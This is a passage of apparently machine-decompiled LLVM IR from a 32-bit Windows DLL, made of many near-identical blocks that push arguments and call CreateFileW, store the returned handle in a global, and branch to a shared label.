  %315 = add i32 %esp.3.reload, -24, !insn.addr !1083
  %316 = inttoptr i32 %315 to i32*, !insn.addr !1083
  store i32 4, i32* %316, align 4, !insn.addr !1083
  %317 = add i32 %esp.3.reload, -28, !insn.addr !1084
  %318 = inttoptr i32 %317 to i32*, !insn.addr !1084
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %318, align 4, !insn.addr !1084
  %319 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1085
  %320 = ptrtoint i32* %319 to i32, !insn.addr !1085
  %321 = add i32 %esp.3.reload, -32, !insn.addr !1086
  %322 = inttoptr i32 %321 to i32*, !insn.addr !1086
  store i32 0, i32* %322, align 4, !insn.addr !1086
  %323 = add i32 %esp.3.reload, -36, !insn.addr !1087
  %324 = inttoptr i32 %323 to i32*, !insn.addr !1087
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %324, align 4, !insn.addr !1087
  %325 = add i32 %esp.3.reload, -40, !insn.addr !1088
  %326 = inttoptr i32 %325 to i32*, !insn.addr !1088
  store i32 2, i32* %326, align 4, !insn.addr !1088
  %327 = add i32 %esp.3.reload, -44, !insn.addr !1089
  %328 = inttoptr i32 %327 to i32*, !insn.addr !1089
  store i32 ptrtoint (i32* @global_var_10039288 to i32), i32* %328, align 4, !insn.addr !1089
  store i32 %320, i32* @global_var_1003e9c0, align 4, !insn.addr !1090
  %329 = add i32 %esp.3.reload, -48, !insn.addr !1091
  %330 = inttoptr i32 %329 to i32*, !insn.addr !1091
  store i32 %320, i32* %330, align 4, !insn.addr !1091
  store i32 %329, i32* %esp.5.reg2mem, !insn.addr !1092
  br label %dec_label_pc_10003485, !insn.addr !1092

dec_label_pc_10002eb3:                            ; preds = %dec_label_pc_10002c24
  %331 = call i32 @function_10002650(), !insn.addr !1093
  store i32 184, i32* %.pre-phi.reg2mem, !insn.addr !1094
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1094
  br label %dec_label_pc_1000348f, !insn.addr !1094

dec_label_pc_10002ec2:                            ; preds = %dec_label_pc_10002c24
  %332 = add i32 %esp.3.reload, -4, !insn.addr !1095
  %333 = inttoptr i32 %332 to i32*, !insn.addr !1095
  store i32 0, i32* %333, align 4, !insn.addr !1095
  %334 = add i32 %esp.3.reload, -8, !insn.addr !1096
  %335 = inttoptr i32 %334 to i32*, !insn.addr !1096
  store i32 128, i32* %335, align 4, !insn.addr !1096
  %336 = add i32 %esp.3.reload, -12, !insn.addr !1097
  %337 = inttoptr i32 %336 to i32*, !insn.addr !1097
  store i32 4, i32* %337, align 4, !insn.addr !1097
  %338 = add i32 %esp.3.reload, -16, !insn.addr !1098
  %339 = inttoptr i32 %338 to i32*, !insn.addr !1098
  store i32 0, i32* %339, align 4, !insn.addr !1098
  %340 = add i32 %esp.3.reload, -20, !insn.addr !1099
  %341 = inttoptr i32 %340 to i32*, !insn.addr !1099
  store i32 1, i32* %341, align 4, !insn.addr !1099
  %342 = add i32 %esp.3.reload, -24, !insn.addr !1100
  %343 = inttoptr i32 %342 to i32*, !insn.addr !1100
  store i32 4, i32* %343, align 4, !insn.addr !1100
  %344 = add i32 %esp.3.reload, -28, !insn.addr !1101
  %345 = inttoptr i32 %344 to i32*, !insn.addr !1101
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %345, align 4, !insn.addr !1101
  %346 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1102
  %347 = ptrtoint i32* %346 to i32, !insn.addr !1102
  %348 = add i32 %esp.3.reload, -32, !insn.addr !1103
  %349 = inttoptr i32 %348 to i32*, !insn.addr !1103
  store i32 0, i32* %349, align 4, !insn.addr !1103
  %350 = add i32 %esp.3.reload, -36, !insn.addr !1104
  %351 = inttoptr i32 %350 to i32*, !insn.addr !1104
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %351, align 4, !insn.addr !1104
  %352 = add i32 %esp.3.reload, -40, !insn.addr !1105
  %353 = inttoptr i32 %352 to i32*, !insn.addr !1105
  store i32 2, i32* %353, align 4, !insn.addr !1105
  %354 = add i32 %esp.3.reload, -44, !insn.addr !1106
  %355 = inttoptr i32 %354 to i32*, !insn.addr !1106
  store i32 ptrtoint (i32* @global_var_1003928c to i32), i32* %355, align 4, !insn.addr !1106
  store i32 %347, i32* @global_var_1003e9c0, align 4, !insn.addr !1107
  %356 = add i32 %esp.3.reload, -48, !insn.addr !1108
  %357 = inttoptr i32 %356 to i32*, !insn.addr !1108
  store i32 %347, i32* %357, align 4, !insn.addr !1108
  store i32 %356, i32* %esp.5.reg2mem, !insn.addr !1109
  br label %dec_label_pc_10003485, !insn.addr !1109

dec_label_pc_10002ef1:                            ; preds = %dec_label_pc_10002c24
  %358 = call i32 @function_10002650(), !insn.addr !1110
  store i32 186, i32* %.pre-phi.reg2mem, !insn.addr !1111
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1111
  br label %dec_label_pc_1000348f, !insn.addr !1111

dec_label_pc_10002f00:                            ; preds = %dec_label_pc_10002c24
  %359 = add i32 %esp.3.reload, -4, !insn.addr !1112
  %360 = inttoptr i32 %359 to i32*, !insn.addr !1112
  store i32 0, i32* %360, align 4, !insn.addr !1112
  %361 = add i32 %esp.3.reload, -8, !insn.addr !1113
  %362 = inttoptr i32 %361 to i32*, !insn.addr !1113
  store i32 128, i32* %362, align 4, !insn.addr !1113
  %363 = add i32 %esp.3.reload, -12, !insn.addr !1114
  %364 = inttoptr i32 %363 to i32*, !insn.addr !1114
  store i32 4, i32* %364, align 4, !insn.addr !1114
  %365 = add i32 %esp.3.reload, -16, !insn.addr !1115
  %366 = inttoptr i32 %365 to i32*, !insn.addr !1115
  store i32 0, i32* %366, align 4, !insn.addr !1115
  %367 = add i32 %esp.3.reload, -20, !insn.addr !1116
  %368 = inttoptr i32 %367 to i32*, !insn.addr !1116
  store i32 1, i32* %368, align 4, !insn.addr !1116
  %369 = add i32 %esp.3.reload, -24, !insn.addr !1117
  %370 = inttoptr i32 %369 to i32*, !insn.addr !1117
  store i32 4, i32* %370, align 4, !insn.addr !1117
  %371 = add i32 %esp.3.reload, -28, !insn.addr !1118
  %372 = inttoptr i32 %371 to i32*, !insn.addr !1118
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %372, align 4, !insn.addr !1118
  %373 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1119
  %374 = ptrtoint i32* %373 to i32, !insn.addr !1119
  %375 = add i32 %esp.3.reload, -32, !insn.addr !1120
  %376 = inttoptr i32 %375 to i32*, !insn.addr !1120
  store i32 0, i32* %376, align 4, !insn.addr !1120
  %377 = add i32 %esp.3.reload, -36, !insn.addr !1121
  %378 = inttoptr i32 %377 to i32*, !insn.addr !1121
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %378, align 4, !insn.addr !1121
  %379 = add i32 %esp.3.reload, -40, !insn.addr !1122
  %380 = inttoptr i32 %379 to i32*, !insn.addr !1122
  store i32 2, i32* %380, align 4, !insn.addr !1122
  %381 = add i32 %esp.3.reload, -44, !insn.addr !1123
  %382 = inttoptr i32 %381 to i32*, !insn.addr !1123
  store i32 ptrtoint (i32* @global_var_10039290 to i32), i32* %382, align 4, !insn.addr !1123
  store i32 %374, i32* @global_var_1003e9c0, align 4, !insn.addr !1124
  %383 = add i32 %esp.3.reload, -48, !insn.addr !1125
  %384 = inttoptr i32 %383 to i32*, !insn.addr !1125
  store i32 %374, i32* %384, align 4, !insn.addr !1125
  store i32 %383, i32* %esp.5.reg2mem, !insn.addr !1126
  br label %dec_label_pc_10003485, !insn.addr !1126

dec_label_pc_10002f2f:                            ; preds = %dec_label_pc_10002c24
  %385 = add i32 %esp.3.reload, -4, !insn.addr !1127
  %386 = inttoptr i32 %385 to i32*, !insn.addr !1127
  store i32 0, i32* %386, align 4, !insn.addr !1127
  %387 = add i32 %esp.3.reload, -8, !insn.addr !1128
  %388 = inttoptr i32 %387 to i32*, !insn.addr !1128
  store i32 128, i32* %388, align 4, !insn.addr !1128
  %389 = add i32 %esp.3.reload, -12, !insn.addr !1129
  %390 = inttoptr i32 %389 to i32*, !insn.addr !1129
  store i32 4, i32* %390, align 4, !insn.addr !1129
  %391 = add i32 %esp.3.reload, -16, !insn.addr !1130
  %392 = inttoptr i32 %391 to i32*, !insn.addr !1130
  store i32 0, i32* %392, align 4, !insn.addr !1130
  %393 = add i32 %esp.3.reload, -20, !insn.addr !1131
  %394 = inttoptr i32 %393 to i32*, !insn.addr !1131
  store i32 1, i32* %394, align 4, !insn.addr !1131
  %395 = add i32 %esp.3.reload, -24, !insn.addr !1132
  %396 = inttoptr i32 %395 to i32*, !insn.addr !1132
  store i32 4, i32* %396, align 4, !insn.addr !1132
  %397 = add i32 %esp.3.reload, -28, !insn.addr !1133
  %398 = inttoptr i32 %397 to i32*, !insn.addr !1133
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %398, align 4, !insn.addr !1133
  %399 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1134
  %400 = ptrtoint i32* %399 to i32, !insn.addr !1134
  %401 = add i32 %esp.3.reload, -32, !insn.addr !1135
  %402 = inttoptr i32 %401 to i32*, !insn.addr !1135
  store i32 0, i32* %402, align 4, !insn.addr !1135
  %403 = add i32 %esp.3.reload, -36, !insn.addr !1136
  %404 = inttoptr i32 %403 to i32*, !insn.addr !1136
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %404, align 4, !insn.addr !1136
  %405 = add i32 %esp.3.reload, -40, !insn.addr !1137
  %406 = inttoptr i32 %405 to i32*, !insn.addr !1137
  store i32 2, i32* %406, align 4, !insn.addr !1137
  %407 = add i32 %esp.3.reload, -44, !insn.addr !1138
  %408 = inttoptr i32 %407 to i32*, !insn.addr !1138
  store i32 ptrtoint (i32* @global_var_10039294 to i32), i32* %408, align 4, !insn.addr !1138
  store i32 %400, i32* @global_var_1003e9c0, align 4, !insn.addr !1139
  %409 = add i32 %esp.3.reload, -48, !insn.addr !1140
  %410 = inttoptr i32 %409 to i32*, !insn.addr !1140
  store i32 %400, i32* %410, align 4, !insn.addr !1140
  store i32 %409, i32* %esp.5.reg2mem, !insn.addr !1141
  br label %dec_label_pc_10003485, !insn.addr !1141

dec_label_pc_10002f5e:                            ; preds = %dec_label_pc_10002c24, %dec_label_pc_10002c24, %dec_label_pc_10002c24
  %411 = add i32 %esp.3.reload, -4, !insn.addr !1142
  %412 = inttoptr i32 %411 to i32*, !insn.addr !1142
  store i32 0, i32* %412, align 4, !insn.addr !1142
  %413 = add i32 %esp.3.reload, -8, !insn.addr !1143
  %414 = inttoptr i32 %413 to i32*, !insn.addr !1143
  store i32 128, i32* %414, align 4, !insn.addr !1143
  %415 = add i32 %esp.3.reload, -12, !insn.addr !1144
  %416 = inttoptr i32 %415 to i32*, !insn.addr !1144
  store i32 4, i32* %416, align 4, !insn.addr !1144
  %417 = add i32 %esp.3.reload, -16, !insn.addr !1145
  %418 = inttoptr i32 %417 to i32*, !insn.addr !1145
  store i32 0, i32* %418, align 4, !insn.addr !1145
  %419 = add i32 %esp.3.reload, -20, !insn.addr !1146
  %420 = inttoptr i32 %419 to i32*, !insn.addr !1146
  store i32 1, i32* %420, align 4, !insn.addr !1146
  %421 = add i32 %esp.3.reload, -24, !insn.addr !1147
  %422 = inttoptr i32 %421 to i32*, !insn.addr !1147
  store i32 4, i32* %422, align 4, !insn.addr !1147
  %423 = add i32 %esp.3.reload, -28, !insn.addr !1148
  %424 = inttoptr i32 %423 to i32*, !insn.addr !1148
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %424, align 4, !insn.addr !1148
  %425 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1149
  %426 = ptrtoint i32* %425 to i32, !insn.addr !1149
  %427 = add i32 %esp.3.reload, -32, !insn.addr !1150
  %428 = inttoptr i32 %427 to i32*, !insn.addr !1150
  store i32 0, i32* %428, align 4, !insn.addr !1150
  %429 = add i32 %esp.3.reload, -36, !insn.addr !1151
  %430 = inttoptr i32 %429 to i32*, !insn.addr !1151
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %430, align 4, !insn.addr !1151
  %431 = add i32 %esp.3.reload, -40, !insn.addr !1152
  %432 = inttoptr i32 %431 to i32*, !insn.addr !1152
  store i32 2, i32* %432, align 4, !insn.addr !1152
  %433 = add i32 %esp.3.reload, -44, !insn.addr !1153
  %434 = inttoptr i32 %433 to i32*, !insn.addr !1153
  store i32 ptrtoint (i32* @global_var_10039298 to i32), i32* %434, align 4, !insn.addr !1153
  store i32 %426, i32* @global_var_1003e9c0, align 4, !insn.addr !1154
  %435 = add i32 %esp.3.reload, -48, !insn.addr !1155
  %436 = inttoptr i32 %435 to i32*, !insn.addr !1155
  store i32 %426, i32* %436, align 4, !insn.addr !1155
  store i32 %435, i32* %esp.5.reg2mem, !insn.addr !1156
  br label %dec_label_pc_10003485, !insn.addr !1156

dec_label_pc_10002f8d:                            ; preds = %dec_label_pc_10002c24
  %437 = add i32 %esp.3.reload, -4, !insn.addr !1157
  %438 = inttoptr i32 %437 to i32*, !insn.addr !1157
  store i32 0, i32* %438, align 4, !insn.addr !1157
  %439 = add i32 %esp.3.reload, -8, !insn.addr !1158
  %440 = inttoptr i32 %439 to i32*, !insn.addr !1158
  store i32 128, i32* %440, align 4, !insn.addr !1158
  %441 = add i32 %esp.3.reload, -12, !insn.addr !1159
  %442 = inttoptr i32 %441 to i32*, !insn.addr !1159
  store i32 4, i32* %442, align 4, !insn.addr !1159
  %443 = add i32 %esp.3.reload, -16, !insn.addr !1160
  %444 = inttoptr i32 %443 to i32*, !insn.addr !1160
  store i32 0, i32* %444, align 4, !insn.addr !1160
  %445 = add i32 %esp.3.reload, -20, !insn.addr !1161
  %446 = inttoptr i32 %445 to i32*, !insn.addr !1161
  store i32 1, i32* %446, align 4, !insn.addr !1161
  %447 = add i32 %esp.3.reload, -24, !insn.addr !1162
  %448 = inttoptr i32 %447 to i32*, !insn.addr !1162
  store i32 4, i32* %448, align 4, !insn.addr !1162
  %449 = add i32 %esp.3.reload, -28, !insn.addr !1163
  %450 = inttoptr i32 %449 to i32*, !insn.addr !1163
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %450, align 4, !insn.addr !1163
  %451 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1164
  %452 = ptrtoint i32* %451 to i32, !insn.addr !1164
  %453 = add i32 %esp.3.reload, -32, !insn.addr !1165
  %454 = inttoptr i32 %453 to i32*, !insn.addr !1165
  store i32 0, i32* %454, align 4, !insn.addr !1165
  %455 = add i32 %esp.3.reload, -36, !insn.addr !1166
  %456 = inttoptr i32 %455 to i32*, !insn.addr !1166
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %456, align 4, !insn.addr !1166
  %457 = add i32 %esp.3.reload, -40, !insn.addr !1167
  %458 = inttoptr i32 %457 to i32*, !insn.addr !1167
  store i32 2, i32* %458, align 4, !insn.addr !1167
  %459 = add i32 %esp.3.reload, -44, !insn.addr !1168
  %460 = inttoptr i32 %459 to i32*, !insn.addr !1168
  store i32 ptrtoint (i32* @global_var_1003929c to i32), i32* %460, align 4, !insn.addr !1168
  store i32 %452, i32* @global_var_1003e9c0, align 4, !insn.addr !1169
  %461 = add i32 %esp.3.reload, -48, !insn.addr !1170
  %462 = inttoptr i32 %461 to i32*, !insn.addr !1170
  store i32 %452, i32* %462, align 4, !insn.addr !1170
  store i32 %461, i32* %esp.5.reg2mem, !insn.addr !1171
  br label %dec_label_pc_10003485, !insn.addr !1171

dec_label_pc_10002fbc:                            ; preds = %dec_label_pc_10002c24
  %463 = add i32 %esp.3.reload, -4, !insn.addr !1172
  %464 = inttoptr i32 %463 to i32*, !insn.addr !1172
  store i32 0, i32* %464, align 4, !insn.addr !1172
  %465 = add i32 %esp.3.reload, -8, !insn.addr !1173
  %466 = inttoptr i32 %465 to i32*, !insn.addr !1173
  store i32 128, i32* %466, align 4, !insn.addr !1173
  %467 = add i32 %esp.3.reload, -12, !insn.addr !1174
  %468 = inttoptr i32 %467 to i32*, !insn.addr !1174
  store i32 4, i32* %468, align 4, !insn.addr !1174
  %469 = add i32 %esp.3.reload, -16, !insn.addr !1175
  %470 = inttoptr i32 %469 to i32*, !insn.addr !1175
  store i32 0, i32* %470, align 4, !insn.addr !1175
  %471 = add i32 %esp.3.reload, -20, !insn.addr !1176
  %472 = inttoptr i32 %471 to i32*, !insn.addr !1176
  store i32 1, i32* %472, align 4, !insn.addr !1176
  %473 = add i32 %esp.3.reload, -24, !insn.addr !1177
  %474 = inttoptr i32 %473 to i32*, !insn.addr !1177
  store i32 4, i32* %474, align 4, !insn.addr !1177
  %475 = add i32 %esp.3.reload, -28, !insn.addr !1178
  %476 = inttoptr i32 %475 to i32*, !insn.addr !1178
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %476, align 4, !insn.addr !1178
  %477 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1179
  %478 = ptrtoint i32* %477 to i32, !insn.addr !1179
  %479 = add i32 %esp.3.reload, -32, !insn.addr !1180
  %480 = inttoptr i32 %479 to i32*, !insn.addr !1180
  store i32 0, i32* %480, align 4, !insn.addr !1180
  %481 = add i32 %esp.3.reload, -36, !insn.addr !1181
  %482 = inttoptr i32 %481 to i32*, !insn.addr !1181
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %482, align 4, !insn.addr !1181
  %483 = add i32 %esp.3.reload, -40, !insn.addr !1182
  %484 = inttoptr i32 %483 to i32*, !insn.addr !1182
  store i32 2, i32* %484, align 4, !insn.addr !1182
  %485 = add i32 %esp.3.reload, -44, !insn.addr !1183
  %486 = inttoptr i32 %485 to i32*, !insn.addr !1183
  store i32 ptrtoint (i32* @global_var_100392a0 to i32), i32* %486, align 4, !insn.addr !1183
  store i32 %478, i32* @global_var_1003e9c0, align 4, !insn.addr !1184
  %487 = add i32 %esp.3.reload, -48, !insn.addr !1185
  %488 = inttoptr i32 %487 to i32*, !insn.addr !1185
  store i32 %478, i32* %488, align 4, !insn.addr !1185
  store i32 %487, i32* %esp.5.reg2mem, !insn.addr !1186
  br label %dec_label_pc_10003485, !insn.addr !1186

dec_label_pc_10002feb:                            ; preds = %dec_label_pc_10002c24
  %489 = add i32 %esp.3.reload, -4, !insn.addr !1187
  %490 = inttoptr i32 %489 to i32*, !insn.addr !1187
  store i32 0, i32* %490, align 4, !insn.addr !1187
  %491 = add i32 %esp.3.reload, -8, !insn.addr !1188
  %492 = inttoptr i32 %491 to i32*, !insn.addr !1188
  store i32 128, i32* %492, align 4, !insn.addr !1188
  %493 = add i32 %esp.3.reload, -12, !insn.addr !1189
  %494 = inttoptr i32 %493 to i32*, !insn.addr !1189
  store i32 4, i32* %494, align 4, !insn.addr !1189
  %495 = add i32 %esp.3.reload, -16, !insn.addr !1190
  %496 = inttoptr i32 %495 to i32*, !insn.addr !1190
  store i32 0, i32* %496, align 4, !insn.addr !1190
  %497 = add i32 %esp.3.reload, -20, !insn.addr !1191
  %498 = inttoptr i32 %497 to i32*, !insn.addr !1191
  store i32 1, i32* %498, align 4, !insn.addr !1191
  %499 = add i32 %esp.3.reload, -24, !insn.addr !1192
  %500 = inttoptr i32 %499 to i32*, !insn.addr !1192
  store i32 4, i32* %500, align 4, !insn.addr !1192
  %501 = add i32 %esp.3.reload, -28, !insn.addr !1193
  %502 = inttoptr i32 %501 to i32*, !insn.addr !1193
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %502, align 4, !insn.addr !1193
  %503 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1194
  %504 = ptrtoint i32* %503 to i32, !insn.addr !1194
  %505 = add i32 %esp.3.reload, -32, !insn.addr !1195
  %506 = inttoptr i32 %505 to i32*, !insn.addr !1195
  store i32 0, i32* %506, align 4, !insn.addr !1195
  %507 = add i32 %esp.3.reload, -36, !insn.addr !1196
  %508 = inttoptr i32 %507 to i32*, !insn.addr !1196
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %508, align 4, !insn.addr !1196
  %509 = add i32 %esp.3.reload, -40, !insn.addr !1197
  %510 = inttoptr i32 %509 to i32*, !insn.addr !1197
  store i32 2, i32* %510, align 4, !insn.addr !1197
  %511 = add i32 %esp.3.reload, -44, !insn.addr !1198
  %512 = inttoptr i32 %511 to i32*, !insn.addr !1198
  store i32 ptrtoint (i32* @global_var_100392a4 to i32), i32* %512, align 4, !insn.addr !1198
  store i32 %504, i32* @global_var_1003e9c0, align 4, !insn.addr !1199
  %513 = add i32 %esp.3.reload, -48, !insn.addr !1200
  %514 = inttoptr i32 %513 to i32*, !insn.addr !1200
  store i32 %504, i32* %514, align 4, !insn.addr !1200
  store i32 %513, i32* %esp.5.reg2mem, !insn.addr !1201
  br label %dec_label_pc_10003485, !insn.addr !1201

dec_label_pc_1000301a:                            ; preds = %dec_label_pc_10002c24
  %515 = add i32 %esp.3.reload, -4, !insn.addr !1202
  %516 = inttoptr i32 %515 to i32*, !insn.addr !1202
  store i32 0, i32* %516, align 4, !insn.addr !1202
  %517 = add i32 %esp.3.reload, -8, !insn.addr !1203
  %518 = inttoptr i32 %517 to i32*, !insn.addr !1203
  store i32 128, i32* %518, align 4, !insn.addr !1203
  %519 = add i32 %esp.3.reload, -12, !insn.addr !1204
  %520 = inttoptr i32 %519 to i32*, !insn.addr !1204
  store i32 4, i32* %520, align 4, !insn.addr !1204
  %521 = add i32 %esp.3.reload, -16, !insn.addr !1205
  %522 = inttoptr i32 %521 to i32*, !insn.addr !1205
  store i32 0, i32* %522, align 4, !insn.addr !1205
  %523 = add i32 %esp.3.reload, -20, !insn.addr !1206
  %524 = inttoptr i32 %523 to i32*, !insn.addr !1206
  store i32 1, i32* %524, align 4, !insn.addr !1206
  %525 = add i32 %esp.3.reload, -24, !insn.addr !1207
  %526 = inttoptr i32 %525 to i32*, !insn.addr !1207
  store i32 4, i32* %526, align 4, !insn.addr !1207
  %527 = add i32 %esp.3.reload, -28, !insn.addr !1208
  %528 = inttoptr i32 %527 to i32*, !insn.addr !1208
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %528, align 4, !insn.addr !1208
  %529 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1209
  %530 = ptrtoint i32* %529 to i32, !insn.addr !1209
  %531 = add i32 %esp.3.reload, -32, !insn.addr !1210
  %532 = inttoptr i32 %531 to i32*, !insn.addr !1210
  store i32 0, i32* %532, align 4, !insn.addr !1210
  %533 = add i32 %esp.3.reload, -36, !insn.addr !1211
  %534 = inttoptr i32 %533 to i32*, !insn.addr !1211
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %534, align 4, !insn.addr !1211
  %535 = add i32 %esp.3.reload, -40, !insn.addr !1212
  %536 = inttoptr i32 %535 to i32*, !insn.addr !1212
  store i32 2, i32* %536, align 4, !insn.addr !1212
  %537 = add i32 %esp.3.reload, -44, !insn.addr !1213
  %538 = inttoptr i32 %537 to i32*, !insn.addr !1213
  store i32 ptrtoint (i32* @global_var_100392a8 to i32), i32* %538, align 4, !insn.addr !1213
  store i32 %530, i32* @global_var_1003e9c0, align 4, !insn.addr !1214
  %539 = add i32 %esp.3.reload, -48, !insn.addr !1215
  %540 = inttoptr i32 %539 to i32*, !insn.addr !1215
  store i32 %530, i32* %540, align 4, !insn.addr !1215
  store i32 %539, i32* %esp.5.reg2mem, !insn.addr !1216
  br label %dec_label_pc_10003485, !insn.addr !1216

dec_label_pc_10003049:                            ; preds = %dec_label_pc_10002c24
  %541 = add i32 %esp.3.reload, -4, !insn.addr !1217
  %542 = inttoptr i32 %541 to i32*, !insn.addr !1217
  store i32 0, i32* %542, align 4, !insn.addr !1217
  %543 = add i32 %esp.3.reload, -8, !insn.addr !1218
  %544 = inttoptr i32 %543 to i32*, !insn.addr !1218
  store i32 128, i32* %544, align 4, !insn.addr !1218
  %545 = add i32 %esp.3.reload, -12, !insn.addr !1219
  %546 = inttoptr i32 %545 to i32*, !insn.addr !1219
  store i32 4, i32* %546, align 4, !insn.addr !1219
  %547 = add i32 %esp.3.reload, -16, !insn.addr !1220
  %548 = inttoptr i32 %547 to i32*, !insn.addr !1220
  store i32 0, i32* %548, align 4, !insn.addr !1220
  %549 = add i32 %esp.3.reload, -20, !insn.addr !1221
  %550 = inttoptr i32 %549 to i32*, !insn.addr !1221
  store i32 1, i32* %550, align 4, !insn.addr !1221
  %551 = add i32 %esp.3.reload, -24, !insn.addr !1222
  %552 = inttoptr i32 %551 to i32*, !insn.addr !1222
  store i32 4, i32* %552, align 4, !insn.addr !1222
  %553 = add i32 %esp.3.reload, -28, !insn.addr !1223
  %554 = inttoptr i32 %553 to i32*, !insn.addr !1223
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %554, align 4, !insn.addr !1223
  %555 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1224
  %556 = ptrtoint i32* %555 to i32, !insn.addr !1224
  %557 = add i32 %esp.3.reload, -32, !insn.addr !1225
  %558 = inttoptr i32 %557 to i32*, !insn.addr !1225
  store i32 0, i32* %558, align 4, !insn.addr !1225
  %559 = add i32 %esp.3.reload, -36, !insn.addr !1226
  %560 = inttoptr i32 %559 to i32*, !insn.addr !1226
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %560, align 4, !insn.addr !1226
  %561 = add i32 %esp.3.reload, -40, !insn.addr !1227
  %562 = inttoptr i32 %561 to i32*, !insn.addr !1227
  store i32 2, i32* %562, align 4, !insn.addr !1227
  %563 = add i32 %esp.3.reload, -44, !insn.addr !1228
  %564 = inttoptr i32 %563 to i32*, !insn.addr !1228
  store i32 ptrtoint (i32* @global_var_100392ac to i32), i32* %564, align 4, !insn.addr !1228
  store i32 %556, i32* @global_var_1003e9c0, align 4, !insn.addr !1229
  %565 = add i32 %esp.3.reload, -48, !insn.addr !1230
  %566 = inttoptr i32 %565 to i32*, !insn.addr !1230
  store i32 %556, i32* %566, align 4, !insn.addr !1230
  store i32 %565, i32* %esp.5.reg2mem, !insn.addr !1231
  br label %dec_label_pc_10003485, !insn.addr !1231

dec_label_pc_10003078:                            ; preds = %dec_label_pc_10002c24
  %567 = add i32 %esp.3.reload, -4, !insn.addr !1232
  %568 = inttoptr i32 %567 to i32*, !insn.addr !1232
  store i32 0, i32* %568, align 4, !insn.addr !1232
  %569 = add i32 %esp.3.reload, -8, !insn.addr !1233
  %570 = inttoptr i32 %569 to i32*, !insn.addr !1233
  store i32 128, i32* %570, align 4, !insn.addr !1233
  %571 = add i32 %esp.3.reload, -12, !insn.addr !1234
  %572 = inttoptr i32 %571 to i32*, !insn.addr !1234
  store i32 4, i32* %572, align 4, !insn.addr !1234
  %573 = add i32 %esp.3.reload, -16, !insn.addr !1235
